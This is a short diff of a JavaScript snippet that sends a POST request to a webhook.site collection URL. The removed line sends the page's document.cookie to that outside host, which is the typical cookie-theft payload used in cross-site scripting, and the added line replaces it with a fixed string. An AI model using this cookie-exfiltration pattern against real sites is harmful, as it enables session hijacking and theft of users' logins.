@@ -5,7 +5,7 @@ fetch('https://webhook.site/f21dc15a-d8b4-468b-9221-60fd48267bcc', {
         'Content-Type': 'application/json', // Adjust as needed
     },
     body: JSON.stringify({
-        cookie: document.cookie,
+        cookie: "ahmed",
     }) // The data you want to send in the request body
 })
 .then(response => response.text()) // Can also use .json() if expecting JSON response
